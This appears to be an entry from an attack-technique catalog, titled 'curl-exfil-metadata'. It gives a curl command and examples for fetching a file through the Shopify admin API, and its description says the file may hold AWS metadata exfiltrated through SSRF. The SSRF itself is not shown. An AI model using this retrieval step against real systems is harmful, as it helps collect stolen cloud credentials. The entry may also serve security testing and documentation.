---
id: c3f4g5h6-j7k8-9012-fghi-6789012345
data: >-
  curl
  "https://shopify-store.myshopify.com/admin/api/2023-01/files/FILE_ID.json" -H
  "X-Shopify-Access-Token: YOUR_TOKEN"
tags:
  - exfiltration
  - aws
type: command
output: '{"file":{"content":"AWS_METADATA_HERE"}}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:24:56.321Z'
verified: false
validated: true
submitted: true
---
# curl-exfil-metadata

## Command

```bash
curl "https://shopify-store.myshopify.com/admin/api/2023-01/files/FILE_ID.json" -H "X-Shopify-Access-Token: YOUR_TOKEN"
```

## Description

Retrieves details of a processed file from Shopify API, potentially containing exfiltrated AWS metadata from SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `FILE_ID` | ID of the uploaded file | Yes |
| `-H "X-Shopify-Access-Token: TOKEN"` | Auth header | Yes |

## Examples

### Basic Usage

```bash
curl "https://example.myshopify.com/admin/api/files/123.json" -H "X-Shopify-Access-Token: shpat_abc"
```

### Advanced Usage

```bash
curl -s "https://example.myshopify.com/admin/api/files/123.json" -H "X-Shopify-Access-Token: shpat_abc" | jq '.file'
```

## Expected Output

JSON object with file properties, possibly including leaked metadata in content or error fields.

## Related

- [[Related Procedure|procedures/Exfiltrate-AWS-Metadata]]
